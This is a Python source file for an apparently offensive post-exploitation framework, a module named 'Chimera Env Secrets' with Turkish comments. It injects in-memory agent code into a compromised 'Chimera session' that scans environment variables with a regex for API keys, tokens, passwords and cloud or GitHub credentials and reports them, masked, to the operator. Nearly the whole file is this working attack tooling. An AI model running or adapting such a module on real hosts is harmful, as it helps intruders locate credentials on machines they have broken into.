# =============================================================================
# Chimera Post: Environment Secrets Scanner
# =============================================================================
# Ortam değişkenlerinde olası secret/token anahtarlarını listeler (stdlib).
#
# KULLANIM:
#   use post/chimera/env_secrets
#   set SESSION 1
#   run
# =============================================================================

from typing import Any

from core.module import BaseModule
from core.option import Option
from core.session_bridge import run_chimera_post_module

AGENT_CODE = r'''
"""Chimera in-memory: scan environment for likely secrets."""
import os
import re
import time

_KEY_RE = re.compile(
    r"(api[_-]?key|secret|token|password|passwd|pwd|auth|credential|"
    r"access[_-]?key|private[_-]?key|aws_|azure_|gcp_|slack_|github_|"
    r"bearer|jwt|session)",
    re.I,
)


def _mask(value, keep=4):
    if value is None:
        return ""
    s = str(value)
    if len(s) <= keep * 2:
        return "*" * len(s)
    return s[:keep] + ("*" * min(12, len(s) - keep * 2)) + s[-keep:]


def run():
    lines = ["=== CHIMERA env_secrets ===", "Tarih: %s" % time.strftime("%Y-%m-%d %H:%M:%S"), ""]
    hits = []
    for key, val in sorted(os.environ.items()):
        if _KEY_RE.search(key) or (val and _KEY_RE.search(val[:80])):
            hits.append((key, val))
    if not hits:
        lines.append("Süphelı ortam degiskeni bulunamadi.")
    else:
        for key, val in hits:
            lines.append("%-32s = %s" % (key, _mask(val)))
        lines.append("")
        lines.append("[+] %s aday degisken (degerler maskeli)" % len(hits))
    return "\n".join(lines)
'''


class env_secrets(BaseModule):
    """Chimera oturumunda ortam değişkeni secret taraması."""

    Name = "Chimera Env Secrets"
    Description = "Chimera session: ortam değişkenlerinde olası secret/token taraması"
    Author = "Mahmut P."
    Category = "post/chimera"
    Version = "1.0"

    def __init__(self) -> None:
        self.Options = {
            "SESSION": Option(
                name="SESSION",
                value="",
                required=True,
                description="Chimera session ID",
            ),
        }
        super().__init__()

    def run(self, options: dict[str, Any]) -> bool:
        return run_chimera_post_module(
            options=options,
            module_name="env_secrets",
            agent_source=AGENT_CODE,
            func_name="run",
        )
